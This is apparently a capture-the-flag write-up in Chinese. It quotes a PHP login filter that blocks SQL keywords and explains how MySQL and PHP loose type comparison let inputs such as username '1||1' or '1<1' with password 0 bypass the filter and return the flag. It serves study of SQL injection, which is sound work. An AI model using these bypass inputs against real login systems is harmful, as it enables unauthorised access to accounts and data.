"""
 //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }



SELECT * FROM kk where username = 1<1 and password = 0
这样就可以查到所有数据
这是弱比较：字符串会转为0 ，所以0=0永远成立
SELECT * FROM kk where username = 0 and password = 0也可以

用户名 1||1
密码 0
同样也可以


在where username=0这样的查询中，因为username都会是字符串，在mysql中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，
因此这个where可以把所有以字母开头的数据查出来。
而password=0的原因在于这里：
if($row['pass']==intval($password))
弱类型比较，看来查出来的pass也都是以字母开头的，所以password=0可以成功弱类型比较，得到flag

"""